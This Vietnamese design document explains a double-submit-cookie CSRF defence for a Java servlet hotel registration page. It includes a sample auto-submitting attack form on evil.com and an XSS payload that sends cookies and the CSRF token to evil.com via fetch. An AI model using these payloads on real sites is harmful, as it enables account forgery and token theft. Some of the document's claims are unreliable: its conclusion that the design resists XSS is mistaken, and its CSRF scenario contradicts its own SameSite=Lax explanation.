#  CSRF Token Flow

##  Overview

**Pattern**: Double-Submit Cookie với HttpOnly - Request này thực sự được tạo từ trang của chúng ta (vì chỉ trang hợp pháp mới chèn đúng token vào form), chứ không phải từ một trang lạ giả mạo.

**Mục đích**: Chống CSRF Attack + XSS Attack
**Token lifetime**: 15 phút

---

##  FLOW 1: User truy cập trang đăng ký lần đầu

### Step 1: Browser gửi request
```http
GET /hotel-management/register HTTP/1.1
Host: localhost:8080
```

### Step 2: RegisterController.doGet() xử lý

```java
protected void doGet(HttpServletRequest request, HttpServletResponse response) {
    // 2.1. Set encoding
    request.setCharacterEncoding("UTF-8");
    response.setCharacterEncoding("UTF-8");

    // 2.2. Tạo CSRF token mới
    String csrfToken = CsrfTokenUtil.generateToken();
    // → Ví dụ: "a3f7e9c2-4b1d-8e5f-9a6c-2d3e4f5a6b7c"

    // 2.3. Chuẩn bị cookie path
    String cookiePath = request.getContextPath().isEmpty() ? "/" : request.getContextPath();
    // → "/hotel-management" hoặc "/"

    // 2.4. Tạo cookie value string
    String cookieValue = String.format(
        "%s=%s; Path=%s; Max-Age=%d; HttpOnly; SameSite=Lax",
        "CSRF-TOKEN",                    // Cookie name
        csrfToken,                        // Token value
        cookiePath,                       // Path
        15 * 60                           // 900 seconds = 15 minutes
    );
    // → "CSRF-TOKEN=a3f7e9c2-4b1d-8e5f-9a6c-2d3e4f5a6b7c; Path=/hotel-management; Max-Age=900; HttpOnly; SameSite=Lax"

    // 2.5. Nếu HTTPS, thêm Secure flag
    if (request.isSecure()) {
        cookieValue += "; Secure";
    }

    // 2.6. Gửi cookie về browser qua HTTP header
    response.addHeader("Set-Cookie", cookieValue);

    // 2.7. Set token vào request attribute để JSP dùng
    request.setAttribute("csrfToken", csrfToken);

    // 2.8. Forward đến register.jsp
    request.getRequestDispatcher("/WEB-INF/views/features/auth/register.jsp").forward(request, response);
}
```

### Step 3: Browser nhận response

```http
HTTP/1.1 200 OK
Set-Cookie: CSRF-TOKEN=a3f7e9c2-4b1d-8e5f-9a6c-2d3e4f5a6b7c; Path=/hotel-management; Max-Age=900; HttpOnly; SameSite=Lax
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>...
```

**Browser lưu cookie:**
```
Cookie Name:  CSRF-TOKEN
Value:        a3f7e9c2-4b1d-8e5f-9a6c-2d3e4f5a6b7c
Domain:       localhost
Path:         /hotel-management
Expires:      21 Oct 2025 14:45:00 GMT (15 phút sau)
HttpOnly:      true   ← JavaScript KHÔNG đọc được
SameSite:     Lax
Secure:       false (true nếu HTTPS)
```

### Step 4: JSP render form

```jsp
<!-- register.jsp -->
<form action="${pageContext.request.contextPath}/register" method="POST" id="registerForm">
    <!-- Token từ request attribute được render vào hidden input -->
    <input type="hidden" id="csrfToken" name="csrfToken" value="${csrfToken}" />
    <!-- Giá trị: a3f7e9c2-4b1d-8e5f-9a6c-2d3e4f5a6b7c -->
    
    <input type="text" name="fullName" />
    <input type="text" name="username" />
    <!-- ... các field khác ... -->
    
    <button type="submit">Create Account</button>
</form>

<script>
    // JavaScript validation khi submit
    document.getElementById('registerForm').addEventListener('submit', function(e) {
        const csrfTokenInput = document.getElementById('csrfToken');
        
        // Kiểm tra token có tồn tại không
        if (!csrfTokenInput.value || csrfTokenInput.value === '') {
            e.preventDefault();
            showError('Security token missing. Please reload the page and try again.');
            return false;
        }
        
        // Nếu có token → cho phép submit
    });
</script>
```

### Step 5: User nhìn thấy form

```html
<!-- HTML đã render trong browser -->
<form action="/hotel-management/register" method="POST">
    <input type="hidden" name="csrfToken" value="a3f7e9c2-4b1d-8e5f-9a6c-2d3e4f5a6b7c" />
    <!-- User thấy các input fields -->
</form>
```

**Tại thời điểm này:**
-  Cookie: `CSRF-TOKEN=a3f7e9c2-4b1d-8e5f-9a6c-2d3e4f5a6b7c` (HttpOnly)
-  Hidden input: `<input name="csrfToken" value="a3f7e9c2-4b1d-8e5f-9a6c-2d3e4f5a6b7c" />`
-  2 giá trị giống hệt nhau

---

##  FLOW 2: User điền form và submit (thành công)

### Step 1: User click "Create Account"

JavaScript validation chạy trước:
```javascript
// Kiểm tra password match
if (password !== confirmPassword) {
    showError('Passwords do not match!');
    return false; // Chặn submit
}

// Kiểm tra CSRF token
if (!csrfTokenInput.value) {
    showError('Security token missing...');
    return false; // Chặn submit
}

//  Tất cả OK → Cho phép submit
```

### Step 2: Browser gửi POST request

```http
POST /hotel-management/register HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Cookie: CSRF-TOKEN=a3f7e9c2-4b1d-8e5f-9a6c-2d3e4f5a6b7c

csrfToken=a3f7e9c2-4b1d-8e5f-9a6c-2d3e4f5a6b7c&fullName=Nguyen+Van+A&username=nguyenvana&password=123456&confirmPassword=123456&email=test@example.com&phone=0123456789&idNumber=123456789&dateOfBirth=2000-01-01&address=Hanoi
```

**Lưu ý:**
- Header `Cookie:` chứa token từ cookie (browser tự động gửi)
- Body `csrfToken=` chứa token từ hidden input (form data)

### Step 3: RegisterController.doPost() xử lý

```java
protected void doPost(HttpServletRequest request, HttpServletResponse response) {
    // 3.1. Set encoding
    request.setCharacterEncoding("UTF-8");
    response.setCharacterEncoding("UTF-8");

    // 3.2. CSRF VALIDATION - Lấy token từ 2 nguồn
    String submittedToken = request.getParameter("csrfToken");
    // → Từ form data: "a3f7e9c2-4b1d-8e5f-9a6c-2d3e4f5a6b7c"
    
    String cookieToken = getCsrfTokenFromCookie(request);
    // → Từ cookie: "a3f7e9c2-4b1d-8e5f-9a6c-2d3e4f5a6b7c"

    // 3.3. So sánh 2 token
    if (submittedToken == null || cookieToken == null || !cookieToken.equals(submittedToken)) {
        //  CSRF ATTACK DETECTED!
        // → Flow chuyển sang FLOW 4
    }
    
    //  Token hợp lệ → Tiếp tục

    // 3.4. Parse form data
    GuestCreateModel createModel = parseRequestToModel(request);
    // → fullName="Nguyen Van A", username="nguyenvana", ...
    
    createModel.trimFields();

    // 3.5. VALIDATION - Kiểm tra required fields
    if (!createModel.hasRequiredFields()) {
        //  Thiếu field bắt buộc
        // → Flow chuyển sang FLOW 3
        return;
    }

    // 3.6. VALIDATION - Kiểm tra password match
    if (!createModel.passwordsMatch()) {
        //  Password không khớp
        // → Flow chuyển sang FLOW 3
        return;
    }

    // 3.7. VALIDATION - Kiểm tra password length
    if (!createModel.isPasswordValid(6)) {
        //  Password quá ngắn
        // → Flow chuyển sang FLOW 3
        return;
    }

    // 3.8. VALIDATION - Kiểm tra username trùng
    if (guestService.isUsernameExists(createModel.getUsername()) ||
        staffService.isUsernameExists(createModel.getUsername())) {
        //  Username đã tồn tại
        // → Flow chuyển sang FLOW 3
        return;
    }

    // 3.9. VALIDATION - Kiểm tra email trùng
    if (createModel.getEmail() != null && !createModel.getEmail().isEmpty() &&
        guestService.isEmailExists(createModel.getEmail())) {
        //  Email đã tồn tại
        // → Flow chuyển sang FLOW 3
        return;
    }

    // 3.10. VALIDATION - Kiểm tra phone trùng
    if (createModel.getPhone() != null && !createModel.getPhone().isEmpty() &&
        guestService.isPhoneExists(createModel.getPhone())) {
        //  Phone đã tồn tại
        // → Flow chuyển sang FLOW 3
        return;
    }

    // 3.11. VALIDATION - Kiểm tra ID number trùng
    if (guestService.isIdNumberExists(createModel.getIdNumber())) {
        //  ID number đã tồn tại
        // → Flow chuyển sang FLOW 3
        return;
    }

    // 3.12. VALIDATION - Kiểm tra tuổi >= 18
    if (createModel.getDateOfBirth() != null &&
        createModel.getDateOfBirth().isAfter(LocalDate.now().minusYears(18))) {
        //  Chưa đủ 18 tuổi
        // → Flow chuyển sang FLOW 3
        return;
    }

    //  TẤT CẢ VALIDATION PASS

    // 3.13. Tạo Guest entity và lưu vào database
    Guest newGuest = createModel.toEntity();
    int guestId = guestService.registerGuest(newGuest);
    
    if (guestId > 0) {
        // 3.14.  ĐĂNG KÝ THÀNH CÔNG
        
        // Xóa CSRF cookie (đã sử dụng xong, không cần nữa)
        Cookie clearCookie = new Cookie("CSRF-TOKEN", "");
        clearCookie.setMaxAge(0); // Xóa ngay
        clearCookie.setPath(cookiePath);
        response.addCookie(clearCookie);
        
        // Set success message
        request.setAttribute("success", 
            "Registration successful! Please check email and login with your credentials.");
        
        // 3.15. Gửi email chào mừng (async, không chặn request)
        if (createModel.getEmail() != null && !createModel.getEmail().trim().isEmpty()) {
            Mailer.sendWelcomeEmail(
                createModel.getEmail(),
                createModel.getFullName(),
                createModel.getUsername()
            );
        }
        
        // 3.16. Forward đến login page
        request.getRequestDispatcher("/WEB-INF/views/features/auth/login.jsp")
            .forward(request, response);
    } else {
        //  LƯU DATABASE THẤT BẠI
        // → Flow chuyển sang FLOW 3
    }
}
```

### Step 4: getCsrfTokenFromCookie() - Helper method

```java
private String getCsrfTokenFromCookie(HttpServletRequest request) {
    Cookie[] cookies = request.getCookies();
    
    if (cookies != null) {
        for (Cookie cookie : cookies) {
            if ("CSRF-TOKEN".equals(cookie.getName())) {
                return cookie.getValue();
                // → "a3f7e9c2-4b1d-8e5f-9a6c-2d3e4f5a6b7c"
            }
        }
    }
    
    return null; // Không tìm thấy cookie
}
```

### Step 5: Browser nhận response (Success)

```http
HTTP/1.1 200 OK
Set-Cookie: CSRF-TOKEN=; Path=/hotel-management; Max-Age=0
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<!-- Login page with success message -->
...
```

**User nhìn thấy:**
```
┌─────────────────────────────────────────┐
│   Registration successful!            │
│  Please check email and login           │
└─────────────────────────────────────────┘

Login Form
[ Username: _________ ]
[ Password: _________ ]
[    Login    ]
```

---

##  FLOW 3: User submit nhưng validation FAIL

### Scenario: Username đã tồn tại...

### Step 1-2: Giống FLOW 2 (submit form)

### Step 3: Validation fail tại bước 3.8

```java
// 3.8. Kiểm tra username trùng
if (guestService.isUsernameExists(createModel.getUsername()) ||
    staffService.isUsernameExists(createModel.getUsername())) {
    
    //  Username "nguyenvana" đã tồn tại!
    
    //  FIX QUAN TRỌNG: Regenerate CSRF token
    regenerateCsrfToken(request, response);
    
    request.setAttribute("errorMessage", "Username already exists");
    request.getRequestDispatcher("/WEB-INF/views/features/auth/register.jsp")
        .forward(request, response);
    return;
}
```

### Step 4: regenerateCsrfToken() thực thi

```java
private void regenerateCsrfToken(HttpServletRequest request, HttpServletResponse response) {
    // 4.1. Tạo token MỚI
    String newCsrfToken = CsrfTokenUtil.generateToken();
    // → Token mới: "b8e4f1a9-3c2d-7f6e-8b5a-1e2f3a4b5c6d"
    
    // 4.2. Set cookie MỚI (ghi đè cookie cũ)
    setCsrfTokenCookie(request, response, newCsrfToken);
    
    // 4.3. Set request attribute MỚI (cho JSP dùng)
    request.setAttribute("csrfToken", newCsrfToken);
}
```

### Step 5: setCsrfTokenCookie() thực thi

```java
private void setCsrfTokenCookie(HttpServletRequest request, HttpServletResponse response, String token) {
    String cookiePath = request.getContextPath().isEmpty() ? "/" : request.getContextPath();
    
    String cookieValue = String.format(
        "%s=%s; Path=%s; Max-Age=%d; HttpOnly; SameSite=Lax",
        "CSRF-TOKEN",
        token,  // Token MỚI: "b8e4f1a9-3c2d-7f6e-8b5a-1e2f3a4b5c6d"
        cookiePath,
        15 * 60
    );
    
    if (request.isSecure()) {
        cookieValue += "; Secure";
    }
    
    // Gửi cookie MỚI về browser
    response.addHeader("Set-Cookie", cookieValue);
}
```

### Step 6: Browser nhận response

```http
HTTP/1.1 200 OK
Set-Cookie: CSRF-TOKEN=b8e4f1a9-3c2d-7f6e-8b5a-1e2f3a4b5c6d; Path=/hotel-management; Max-Age=900; HttpOnly; SameSite=Lax
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<!-- Register page với error message -->
...
```

**Browser cập nhật cookie:**
```
Cookie Name:  CSRF-TOKEN
Value:        b8e4f1a9-3c2d-7f6e-8b5a-1e2f3a4b5c6d  ← MỚI!
Domain:       localhost
Path:         /hotel-management
Expires:      21 Oct 2025 14:50:00 GMT (15 phút mới)
HttpOnly:      true
```

### Step 7: JSP render form với token MỚI

```jsp
<!-- register.jsp nhận được: -->
<!-- - request.getAttribute("csrfToken") = "b8e4f1a9-3c2d-7f6e-8b5a-1e2f3a4b5c6d" -->
<!-- - request.getAttribute("errorMessage") = "Username already exists" -->

<!-- Error message -->
<div class="error-message"> Username already exists</div>

<form action="/hotel-management/register" method="POST">
    <!-- Token MỚI được render -->
    <input type="hidden" name="csrfToken" value="b8e4f1a9-3c2d-7f6e-8b5a-1e2f3a4b5c6d" />
    
    <!-- Form giữ lại data cũ (nếu có preserve logic) -->
    <input type="text" name="fullName" value="${param.fullName}" />
    <input type="text" name="username" value="${param.username}" />
    <!-- ... -->
    
    <button type="submit">Create Account</button>
</form>
```

### Step 8: User sửa lỗi và submit lại

**Lúc này:**
-  Cookie: `CSRF-TOKEN=b8e4f1a9-3c2d-7f6e-8b5a-1e2f3a4b5c6d` (MỚI)
-  Hidden input: `value="b8e4f1a9-3c2d-7f6e-8b5a-1e2f3a4b5c6d"` (MỚI)
-  User sửa username thành "nguyenvanb"
-  Click submit lại

→ Quay lại FLOW 2, lần này thành công!

---

##  FLOW 4: CSRF Attack bị chặn

### Scenario: Hacker tạo trang web giả mạo

### Step 1: Hacker tạo trang evil.com

```html
<!-- https://evil.com/attack.html -->
<!DOCTYPE html>
<html>
<body>
    <h1>Click here to win $1000!</h1>
    
    <!-- Form tự động submit đến target website -->
    <form id="evilForm" action="http://localhost:8080/hotel-management/register" method="POST">
        <input type="hidden" name="fullName" value="Hacked User" />
        <input type="hidden" name="username" value="hackeduser" />
        <input type="hidden" name="password" value="hacked123" />
        <input type="hidden" name="confirmPassword" value="hacked123" />
        <input type="hidden" name="email" value="hacker@evil.com" />
        <input type="hidden" name="phone" value="0000000000" />
        <input type="hidden" name="idNumber" value="999999999" />
        <input type="hidden" name="dateOfBirth" value="1990-01-01" />
        
        <!-- ️ Hacker KHÔNG biết CSRF token của victim! -->
        <input type="hidden" name="csrfToken" value="FAKE-TOKEN-123" />
    </form>
    
    <script>
        // Auto-submit form
        document.getElementById('evilForm').submit();
    </script>
</body>
</html>
```

### Step 2: Victim (đã login vào localhost:8080) click vào link evil.com

### Step 3: Browser tự động submit form

```http
POST /hotel-management/register HTTP/1.1
Host: localhost:8080
Origin: https://evil.com
Referer: https://evil.com/attack.html
Cookie: CSRF-TOKEN=a3f7e9c2-4b1d-8e5f-9a6c-2d3e4f5a6b7c
       (Browser tự động gửi cookie của localhost:8080)

csrfToken=FAKE-TOKEN-123&fullName=Hacked+User&username=hackeduser&password=hacked123&...
```

**Phân tích:**
- Cookie: `CSRF-TOKEN=a3f7e9c2-...` (token THẬT từ victim)
- Form data: `csrfToken=FAKE-TOKEN-123` (token GIẢ từ hacker)

### Step 4: RegisterController.doPost() validate

```java
String submittedToken = request.getParameter("csrfToken");
// → "FAKE-TOKEN-123" (từ hacker)

String cookieToken = getCsrfTokenFromCookie(request);
// → "a3f7e9c2-4b1d-8e5f-9a6c-2d3e4f5a6b7c" (từ victim)

if (submittedToken == null || cookieToken == null || !cookieToken.equals(submittedToken)) {
    //  "FAKE-TOKEN-123" != "a3f7e9c2-4b1d-8e5f-9a6c-2d3e4f5a6b7c"
    //  CSRF ATTACK DETECTED!
    
    regenerateCsrfToken(request, response);
    request.setAttribute("errorMessage", "Invalid CSRF token. Please try again.");
    request.getRequestDispatcher("/WEB-INF/views/features/auth/register.jsp")
        .forward(request, response);
    return; //  CHẶN REQUEST
}

// Code sau KHÔNG được thực thi
// Hacker KHÔNG thể tạo account
```

### Step 5: Victim nhìn thấy error page

```
┌─────────────────────────────────────────┐
│   Invalid CSRF token.                 │
│  Please try again.                      │
└─────────────────────────────────────────┘
```

**Tại sao hacker không lấy được token thật?**
- Cookie có `HttpOnly` → JavaScript KHÔNG đọc được
- Cookie có `SameSite=Lax` → Chỉ gửi từ cùng site
- Token được generate random → Hacker không đoán được

---

##  FLOW 5: XSS Attack bị chặn

### Scenario: Hacker inject malicious script

### Step 1: Hacker tìm lỗ hổng XSS 

```html
<!-- Giả sử có lỗ hổng reflected XSS trong search feature -->
http://localhost:8080/hotel-management/search?q=<script>alert('XSS')</script>
```

### Step 2: Hacker cố gắng đánh cắp CSRF token

```html
<!-- Hacker inject script này: -->
<script>
    // Cố gắng đọc cookie
    var cookies = document.cookie;
    console.log(cookies);
    // → "sessionId=abc123; otherCookie=xyz"
    // →  KHÔNG THẤY "CSRF-TOKEN" vì HttpOnly!
    
    // Cố gắng gửi về server của hacker
    fetch('https://evil.com/steal?cookies=' + document.cookie);
    // →  Chỉ lấy được các cookie KHÔNG có HttpOnly
    
    // Cố gắng đọc hidden input
    var csrfInput = document.getElementById('csrfToken');
    if (csrfInput) {
        var token = csrfInput.value;
        fetch('https://evil.com/steal?token=' + token);
        // →  CÓ THỂ lấy được token từ hidden input!
        // → NHƯNG: Hacker vẫn cần cookie để submit form
        // →  Cookie HttpOnly KHÔNG gửi được cross-origin
    }
</script>
```

### Step 3: Tại sao vẫn an toàn?

**Hacker chỉ lấy được token từ hidden input**
- Hacker biết token: `a3f7e9c2-4b1d-8e5f-9a6c-2d3e4f5a6b7c`
- Hacker tạo form trên evil.com với token này
-  NHƯNG: Browser KHÔNG gửi cookie `CSRF-TOKEN` từ localhost đến evil.com (SameSite=Lax)
-  Server validate: cookieToken = null, submittedToken = "a3f7e9c2-..."
-  null != "a3f7e9c2-..." → CSRF validation FAIL


**Kết luận:**
- HttpOnly cookie chống XSS đánh cắp token qua `document.cookie`
- SameSite=Lax chống CSRF từ cross-origin
- Double-submit pattern đảm bảo cần cả cookie VÀ form data

---



##  Security Features

### 1. **HttpOnly Cookie**
```
Set-Cookie: CSRF-TOKEN=...; HttpOnly
```
-  JavaScript KHÔNG đọc được via `document.cookie`
-  Chống XSS đánh cắp token
-  Nhưng vẫn đọc được từ hidden input 

### 2. **SameSite=Lax**
```
Set-Cookie: CSRF-TOKEN=...; SameSite=Lax
```
-  Cookie chỉ gửi khi request từ cùng site
-  Chống CSRF từ domain khác
-  Cho phép navigation GET (click link)

### 3. **Max-Age=900 (15 phút)**
```
Set-Cookie: CSRF-TOKEN=...; Max-Age=900
```
-  Token tự động expire sau 15 phút
-  Giảm window of attack
-  User phải request lại nếu timeout

### 4. **Secure Flag **
```
Set-Cookie: CSRF-TOKEN=...; Secure
```
-  Cookie chỉ gửi qua HTTPS
-  Chống man-in-the-middle attack

### 5. **Double-Submit Pattern**
```
Validate: cookieToken == submittedToken
```
-  Cần cả 2 giá trị khớp nhau
-  Hacker không thể fake cả 2 cùng lúc
-  Stateless 

---
- 🛡️ CSRF Protection: Double-submit cookie
- 🛡️ XSS Protection: HttpOnly cookie
- 🛡️ Token Rotation: Regenerate on error
- 🛡️ Time-limited: 15 minutes expiry
- 🛡️ Secure: HTTPS only 

